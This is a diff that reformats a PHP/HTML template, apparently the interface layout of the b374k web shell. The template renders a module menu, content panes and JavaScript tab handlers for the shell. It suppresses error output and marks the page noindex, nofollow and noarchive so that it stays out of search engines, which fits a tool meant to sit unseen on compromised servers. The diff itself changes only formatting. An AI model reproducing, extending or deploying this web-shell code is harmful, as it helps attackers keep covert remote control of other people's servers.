@@ -1,23 +1,22 @@
 <?php
-	$error = @ob_get_contents();
-	$error_html = (!empty($error))?"<pre class='phpError border'>".str_replace("\n\n", "\n", html_safe($error))."</pre>":"";
-	@ob_end_clean();
-	error_reporting(0);
-	@ini_set('display_errors','0');
-
+$error = @ob_get_contents();
+$error_html = (!empty($error)) ? "<pre class='phpError border'>" . str_replace("\n\n", "\n", html_safe($error)) . "</pre>" : "";
+@ob_end_clean();
+error_reporting(0);
+@ini_set('display_errors', '0');
 
 ?><!doctype html>
 <html>
 <head>
-<title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
+<title><?php echo $GLOBALS['title'] . " " . $GLOBALS['ver']; ?></title>
 <meta charset='<?php echo DETECT_SYS_CHARSET; ?>'>
 <meta name='robots' content='noindex, nofollow, noarchive'>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
-<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
+<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k'); ?>'>
 <style type="text/css">
 <__CSS__>
 #navigation{position:fixed;left:-16px;top:46%;}
-#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
+#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow'); ?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
 #totop:hover,#tobottom:hover{opacity:0.80;}
 #toggleBasicInfo{display:none;float:right;margin:0;}
 #basicInfoSplitter{display:none;}
@@ -33,8 +32,8 @@
 	<div id='header'>
 		<!--header info start-->
 		<div id='headerNav'>
-			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
-			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;
+			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title'] . " " . $GLOBALS['ver'] ?></a></span>
+			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k'); ?>' />&nbsp;
 			<span id='nav'><?php echo $nav; ?></span>
 			<font color="#FFFFFF"><a class="navbar" data-path="<?php echo $GLOBALS['home_cwd']; ?>">[Home]</a></font>
 
@@ -46,10 +45,10 @@
 		<!--menu start-->
 		<div id='menu'>
 			<?php
-				foreach($GLOBALS['module_to_load'] as $k){
-					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";
-				}
-			?>
+foreach ($GLOBALS['module_to_load'] as $k) {
+	echo "<a class='menuitem' id='menu" . $GLOBALS['module'][$k]['id'] . "' href='#!" . $GLOBALS['module'][$k]['id'] . "'>" . $GLOBALS['module'][$k]['title'] . "</a>";
+}
+?>
 		</div>
 		<!--menu end-->
 
@@ -69,11 +68,11 @@
 		<!--server info end-->
 
 		<?php
-			foreach($GLOBALS['module_to_load'] as $k){
-				$content = $GLOBALS['module'][$k]['content'];
-				echo "<div class='menucontent' id='".$GLOBALS['module'][$k]['id']."'>".$content."</div>";
-			}
-		?>
+foreach ($GLOBALS['module_to_load'] as $k) {
+	$content = $GLOBALS['module'][$k]['content'];
+	echo "<div class='menucontent' id='" . $GLOBALS['module'][$k]['id'] . "'>" . $content . "</div>";
+}
+?>
 	</div>
 	<!--content end-->
 
@@ -88,16 +87,16 @@
 <!--script start-->
 <script type='text/javascript'>
 var targeturl = '<?php echo get_self(); ?>';
-var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
-var win = <?php echo (is_win())?'true':'false';?>;
+var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']); ?>';
+var win = <?php echo (is_win()) ? 'true' : 'false'; ?>;
 var init_shell = true;
 <__ZEPTO__>
 <__JS__>
 
 <?php
-	foreach($GLOBALS['module_to_load'] as $k){
-		echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";
-	}
+foreach ($GLOBALS['module_to_load'] as $k) {
+	echo "function " . $GLOBALS['module'][$k]['id'] . "(){ " . $GLOBALS['module'][$k]['js_ontabselected'] . " }\n";
+}
 ?>
 </script>
 <!--script end-->
